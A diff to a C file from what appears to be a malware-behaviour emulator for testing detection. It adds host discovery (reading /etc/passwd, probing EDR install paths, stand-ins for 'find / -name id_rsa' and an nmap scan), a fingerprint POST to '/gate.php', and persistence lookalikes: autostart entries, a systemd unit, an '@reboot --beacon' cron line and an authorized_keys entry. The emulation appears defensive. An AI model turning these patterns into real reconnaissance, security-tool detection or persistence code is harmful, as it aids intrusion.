@@ -1,71 +1,26 @@
 // SPDX-License-Identifier: GPL-3.0-only
 // Copyright (c) 2026 MikiMiku (MoreMorePwn)
 //
-// discovery.c — host discovery, DGA output and persistence shapes.
+// discovery.c — host discovery and persistence shapes.
 //
 // Nothing here changes the guest's real configuration: the persistence files
-// are written below the per-run work directory and removed with it, and DGA
-// candidates are printed but never resolved.
+// are lookalikes below the per-run work directory (a ".bashrc", a
+// ".ssh/authorized_keys", a ".config/systemd/user" unit, a "security/pam_*.so"
+// name) and are removed with it. Commands that would change the system
+// (crontab, useradd, systemctl enable) exist only as exec stand-ins: this
+// binary started with that argument vector, which does nothing.
 #include "samples.h"
 
+#include <dirent.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
+#include <sys/syscall.h>
 #include <sys/utsname.h>
-#include <time.h>
 #include <unistd.h>
-
-static int write_all(int fd, const void *buffer, size_t length)
-{
-    const char *cursor = buffer;
-    while (length > 0) {
-        ssize_t written = write(fd, cursor, length);
-        if (written < 0) {
-            if (errno == EINTR)
-                continue;
-            return -1;
-        }
-        if (written == 0)
-            return -1;
-        cursor += written;
-        length -= (size_t)written;
-    }
-    return 0;
-}
-
-static int write_text(const char *path, const char *text)
-{
-    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
-    if (fd < 0)
-        return -1;
-    int result = write_all(fd, text, strlen(text));
-    if (close(fd) != 0)
-        result = -1;
-    return result;
-}
-
-static int ensure_dirs(const char *base, const char *relative)
-{
-    char path[512];
-    int length = snprintf(path, sizeof path, "%s/%s", base, relative);
-    if (length < 0 || (size_t)length >= sizeof path)
-        return -1;
-    for (char *cursor = path + strlen(base) + 1;; cursor++) {
-        if (*cursor != '/' && *cursor != '\0')
-            continue;
-        char saved = *cursor;
-        *cursor = '\0';
-        if (mkdir(path, 0700) != 0 && errno != EEXIST)
-            return -1;
-        *cursor = saved;
-        if (!saved)
-            break;
-    }
-    return 0;
-}
 
 static void os_pretty_name(char *output, size_t cap)
 {
@@ -110,18 +65,19 @@ SCENARIO(recon)
     char body[1024];
     int body_length = snprintf(body, sizeof body, "%s&os=%s&stage=recon", fingerprint, os);
     if (body_length < 0 || (size_t)body_length >= sizeof body)
-        body_length = (int)strlen(body);
-    int staged = 0;
+        body[sizeof body - 1] = 0;
     char staged_path[600] = "";
-    if (ensure_dirs(options->workdir, "stage") == 0) {
-        snprintf(staged_path, sizeof staged_path, "%s/stage/recon.txt", options->workdir);
-        staged = write_text(staged_path, body) == 0;
-    }
+    int staged = 0;
+    char directory[600];
+    if (sample_path(directory, sizeof directory, options->workdir, "stage") == 0 &&
+        sample_mkdir_p(directory) == 0 &&
+        sample_path(staged_path, sizeof staged_path, directory, "recon.txt") == 0)
+        staged = sample_write_text(staged_path, body) == 0;
     unsigned long long received = 0;
     const char *host = sample_host(options);
     int port = sample_port(options, SAMPLE_HTTP_PORT);
-    int delivered =
-        sample_http_request(host, port, "POST", "/gate.php", body, (size_t)body_length, &received) == 0;
+    int delivered = sample_http_request(host, port, "POST", "/gate.php", body, strlen(body),
+                                     &received) == 0;
     if (!delivered)
         sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
     sample_pass(name, "collected %zu bytes (%s), staged %s, exfil POST %s to %s:%d", length, os,
@@ -129,108 +85,211 @@ SCENARIO(recon)
     return 0;
 }
 
-static uint32_t xorshift(uint32_t *state)
+// Reads at most `cap` bytes of a world-readable file; returns the count or -1.
+static ssize_t slurp(const char *path, size_t cap)
 {
-    uint32_t value = *state;
-    value ^= value << 13;
-    value ^= value >> 17;
-    value ^= value << 5;
-    *state = value;
-    return value;
+    char buffer[4096];
+    int fd = open(path, O_RDONLY | O_CLOEXEC);
+    if (fd < 0)
+        return -1;
+    ssize_t total = 0, got;
+    while ((size_t)total < cap && (got = read(fd, buffer, sizeof buffer)) > 0)
+        total += got;
+    close(fd);
+    return total;
 }
 
-SCENARIO(dga)
+static const char *const read_groups[][8] = {
+    {"user", "/etc/passwd", "/etc/group", NULL},
+    {"system", "/proc/version", "/proc/meminfo", "/etc/hostname", "/etc/os-release", NULL},
+    {"network", "/etc/resolv.conf", "/proc/net/route", "/proc/net/dev", "/proc/net/arp",
+     "/proc/net/tcp", NULL},
+};
+
+// Probed with stat only, present or not.
+static const char *const security_paths[] = {
+    "/usr/local/aegis",     "/usr/local/qcloud", "/opt/CrowdStrike",     "/opt/sentinelone",
+    "/opt/carbonblack",     "/var/ossec",        "/etc/wazuh",           "/etc/falco",
+    "/usr/bin/falco",       "/usr/bin/osqueryd", "/usr/sbin/clamd",      "/opt/microsoft/mdatp",
+    "/sys/fs/selinux",      "/etc/apparmor.d",   "/sys/kernel/security/apparmor",
+};
+
+#define TREE_DIRS 232
+#define PROCESS_PROBES 16
+
+SCENARIO(discovery)
 {
-    const char *name = "dga";
-    static const char *tlds[] = {"com", "net", "org", "info", "biz"};
-    time_t now = time(NULL);
-    struct tm broken_down;
-    localtime_r(&now, &broken_down);
-    uint32_t date = (uint32_t)(broken_down.tm_year + 1900) * 10000u +
-                    (uint32_t)(broken_down.tm_mon + 1) * 100u + (uint32_t)broken_down.tm_mday;
-    uint32_t state = date ^ 0x5eed5eedu;
-    int count = options->rounds * 5;
-    if (count > 200)
-        count = 200;
-    for (int i = 0; i < count; i++) {
-        char domain[64];
-        size_t at = 0;
-        int length = 10 + (int)(xorshift(&state) % 9);
-        for (int c = 0; c < length && at + 2 < sizeof domain; c++)
-            domain[at++] = (char)('a' + xorshift(&state) % 26);
-        domain[at++] = '.';
-        const char *tld = tlds[xorshift(&state) % (sizeof tlds / sizeof tlds[0])];
-        snprintf(domain + at, sizeof domain - at, "%s", tld);
-        if (i < 6)
-            sample_note(name, "candidate %s", domain);
+    const char *name = "discovery";
+    int read_ok = 0, read_total = 0;
+    for (size_t g = 0; g < sizeof read_groups / sizeof read_groups[0]; g++) {
+        for (size_t i = 1; read_groups[g][i]; i++) {
+            read_total++;
+            if (slurp(read_groups[g][i], 16384) >= 0)
+                read_ok++;
+        }
     }
-    sample_pass(name, "%d deterministic candidates for %04d-%02d-%02d (printed only, not resolved)",
-             count, broken_down.tm_year + 1900, broken_down.tm_mon + 1, broken_down.tm_mday);
+
+    // Process enumeration: the first pids a listing of /proc gives, then the
+    // low pids, comm and stat only (never environ or cmdline).
+    int probed = 0;
+    DIR *proc = opendir("/proc");
+    if (proc) {
+        struct dirent *entry;
+        while (probed < PROCESS_PROBES && (entry = readdir(proc))) {
+            if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
+                continue;
+            char path[64];
+            snprintf(path, sizeof path, "/proc/%.12s/comm", entry->d_name);
+            slurp(path, 256);
+            snprintf(path, sizeof path, "/proc/%.12s/stat", entry->d_name);
+            slurp(path, 512);
+            probed++;
+        }
+        closedir(proc);
+    }
+    for (int pid = 1; probed < PROCESS_PROBES && pid < 400; pid++, probed++) {
+        char path[64];
+        snprintf(path, sizeof path, "/proc/%d/comm", pid);
+        slurp(path, 256);
+    }
+
+    int present = 0;
+    for (size_t i = 0; i < sizeof security_paths / sizeof security_paths[0]; i++) {
+        struct stat info;
+        if (stat(security_paths[i], &info) == 0)
+            present++;
+    }
+
+    // A directory sweep over a tree this run builds, so the count is the same
+    // on every guest.
+    char tree[600];
+    int swept = 0;
+    if (sample_path(tree, sizeof tree, options->workdir, "tree") == 0 && sample_mkdir_p(tree) == 0) {
+        for (int i = 0; i < TREE_DIRS; i++) {
+            char leaf[64], path[700];
+            snprintf(leaf, sizeof leaf, "d%03d", i);
+            if (sample_path(path, sizeof path, tree, leaf) != 0 || mkdir(path, 0700) != 0)
+                break;
+        }
+        for (int i = 0; i < TREE_DIRS; i++) {
+            char leaf[64], path[700];
+            snprintf(leaf, sizeof leaf, "d%03d", i);
+            if (sample_path(path, sizeof path, tree, leaf) != 0)
+                break;
+            DIR *dir = opendir(path);
+            if (!dir)
+                continue;
+            while (readdir(dir))
+                ;
+            closedir(dir);
+            swept++;
+        }
+    }
+
+    static const struct spoof tools[] = {
+        {"discovery.process_enum", {"ps", "aux", NULL}},
+        {"discovery.user_enum", {"id", NULL}},
+        {"discovery.user_enum", {"whoami", NULL}},
+        {"discovery.network_config", {"ip", "addr", "show", NULL}},
+        {"discovery.system_info", {"uname", "-a", NULL}},
+        {"discovery.system_info", {"lsb_release", "-a", NULL}},
+        {"discovery.file_search", {"find", "/", "-name", "id_rsa", "-o", "-name", "*.pem", NULL}},
+        {"discovery.network_scan", {"nmap", "-sS", "-p", "22,80,443", "10.0.2.0/24", NULL}},
+    };
+    int ran = sample_spoof_all(name, tools, sizeof tools / sizeof tools[0]);
+
+    sample_pass(name, "%d/%d files read, %d process probes, %d/%zu security paths present, %d "
+                   "directories swept, %d/%zu stand-in tools",
+             read_ok, read_total, probed, present,
+             sizeof security_paths / sizeof security_paths[0], swept, ran,
+             sizeof tools / sizeof tools[0]);
+    if (probed < PROCESS_PROBES)
+        sample_note(name, "only %d process probes were made", probed);
+    if (swept < TREE_DIRS)
+        sample_unavailable(name, "swept %d of %d directories (%s)", swept, TREE_DIRS,
+                        strerror(errno));
+    sample_note(name, "stand-in tools are this binary started as ps, id, ip, find and nmap; "
+                   "the programs themselves are never run");
     return 0;
 }
 
 SCENARIO(persistence)
 {
     const char *name = "persistence";
-    if (ensure_dirs(options->workdir, ".config/autostart") != 0 ||
-        ensure_dirs(options->workdir, ".config/systemd/user") != 0 ||
-        ensure_dirs(options->workdir, ".local/bin") != 0) {
-        sample_fail(name, "work directories: %s", strerror(errno));
-        return 1;
+    static const char *const directories[] = {".config/autostart", ".config/systemd/user",
+                                              ".config/antinomie-demo", ".local/bin", ".ssh",
+                                              "lib/security"};
+    char path[600], executable[600], desktop[600], service[600], crontab[600];
+    for (size_t i = 0; i < sizeof directories / sizeof directories[0]; i++) {
+        if (sample_path(path, sizeof path, options->workdir, directories[i]) != 0 ||
+            sample_mkdir_p(path) != 0) {
+            sample_fail(name, "work directory %s: %s", directories[i], strerror(errno));
+            return 1;
+        }
     }
-    char executable[600], desktop[600], service[600], crontab[600];
-    snprintf(executable, sizeof executable, "%s/.local/bin/antinomie-demo", options->workdir);
-    snprintf(desktop, sizeof desktop, "%s/.config/autostart/antinomie-demo.desktop",
-             options->workdir);
-    snprintf(service, sizeof service, "%s/.config/systemd/user/antinomie-demo.service",
-             options->workdir);
-    snprintf(crontab, sizeof crontab, "%s/crontab.txt", options->workdir);
+    sample_path(executable, sizeof executable, options->workdir, ".local/bin/antinomie-demo");
+    sample_path(desktop, sizeof desktop, options->workdir,
+             ".config/autostart/antinomie-demo.desktop");
+    sample_path(service, sizeof service, options->workdir,
+             ".config/systemd/user/antinomie-demo.service");
+    sample_path(crontab, sizeof crontab, options->workdir, "crontab.txt");
 
     char text[1024];
+    int written = 0, total = 0;
     snprintf(text, sizeof text,
              "[Desktop Entry]\nType=Application\nName=System Helper\nExec=%s --beacon\n"
              "X-GNOME-Autostart-enabled=true\n",
              executable);
-    int written = write_text(desktop, text) == 0;
+    total++, written += sample_write_text(desktop, text) == 0;
     snprintf(text, sizeof text,
              "[Unit]\nDescription=System Helper\n\n[Service]\nExecStart=%s --beacon\n"
              "Restart=always\n\n[Install]\nWantedBy=default.target\n",
              executable);
-    written += write_text(service, text) == 0;
+    total++, written += sample_write_text(service, text) == 0;
     snprintf(text, sizeof text, "@reboot %s --beacon >/dev/null 2>&1\n", executable);
-    written += write_text(crontab, text) == 0;
-
-    // A copy of this binary where an autostart entry would expect it. This is
-    // the only large write; it is capped and stays in the work directory.
-    int copied = 0;
-    char self[4096];
-    ssize_t self_length = readlink("/proc/self/exe", self, sizeof self - 1);
-    if (self_length > 0) {
-        self[self_length] = 0;
-        int input = open(self, O_RDONLY | O_CLOEXEC);
-        int output = open(executable, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0700);
-        if (input >= 0 && output >= 0) {
-            char buffer[65536];
-            ssize_t got;
-            size_t total = 0;
-            copied = 1;
-            while ((got = read(input, buffer, sizeof buffer)) > 0) {
-                total += (size_t)got;
-                if (total > (8u << 20) || write_all(output, buffer, (size_t)got) != 0) {
-                    copied = 0;
-                    break;
-                }
-            }
-            if (copied)
-                chmod(executable, 0700);
-        }
-        if (input >= 0)
-            close(input);
-        if (output >= 0)
-            close(output);
+    total++, written += sample_write_text(crontab, text) == 0;
+    struct {
+        const char *relative;
+        const char *content;
+    } lookalikes[] = {
+        {".bashrc", "# antinomie-demo\nexport PATH=\"$PATH:$HOME/.local/bin\"\n"},
+        {".ssh/authorized_keys", "ssh-ed25519 AAAAANTINOMIEDEMO demo@antinomie.invalid\n"},
+        {"lib/security/pam_antinomie.so", "ANTINOMIE-DEMO placeholder, not a shared object\n"},
+        {".config/antinomie-demo/settings.ini", "[demo]\nbeacon=on\n"},
+    };
+    for (size_t i = 0; i < sizeof lookalikes / sizeof lookalikes[0]; i++) {
+        total++;
+        if (sample_path(path, sizeof path, options->workdir, lookalikes[i].relative) == 0)
+            written += sample_write_text(path, lookalikes[i].content) == 0;
     }
-    sample_pass(name, "%d/3 persistence files and %s in %s", written,
-             copied ? "a self-copy" : "no self-copy", options->workdir);
-    sample_note(name, "the real ~/.config, systemd user units and crontab are not touched");
+
+    // A copy of this binary where an autostart entry would expect it. It is the
+    // only large write; it is capped and stays in the work directory.
+    char self[512];
+    int copied = sample_self_path(self, sizeof self) == 0 &&
+                 sample_copy_file(self, executable, 0700, 8u << 20) == 0;
+
+    // The commands that would make these permanent, as stand-ins only.
+    char *const crontab_cmd[] = {"crontab", crontab, NULL};
+    char *const at_cmd[] = {"at", "-f", crontab, "now", NULL};
+    char *const user_cmd[] = {"useradd", "-M", "-s", "/usr/sbin/nologin", "antinomie-demo", NULL};
+    char *const rc_cmd[] = {"update-rc.d", "antinomie-demo", "defaults", NULL};
+    char *const unit_cmd[] = {"systemctl", "--user", "enable", "antinomie-demo.service", NULL};
+    char *const *const stand_ins[] = {crontab_cmd, at_cmd, user_cmd, rc_cmd, unit_cmd};
+    int ran = 0;
+    for (size_t i = 0; i < sizeof stand_ins / sizeof stand_ins[0]; i++)
+        ran += sample_spoof(stand_ins[i], NULL) == 0;
+
+    // A kernel-module load on a descriptor that does not exist: the call is
+    // the shape; the kernel refuses it before it looks at any module.
+    long module = syscall(SYS_finit_module, -1, "", 0);
+    int module_errno = errno;
+
+    sample_pass(name, "%d/%d lookalike files, %s, %d/%zu stand-in commands, finit_module(-1) -> %s",
+             written, total, copied ? "a self-copy" : "no self-copy", ran,
+             sizeof stand_ins / sizeof stand_ins[0], module == 0 ? "OK?" : strerror(module_errno));
+    sample_note(name, "the real ~/.config, systemd units, crontab and accounts are not touched");
+    if (!copied)
+        sample_unavailable(name, "self-copy failed: %s", strerror(errno));
     return 0;
 }
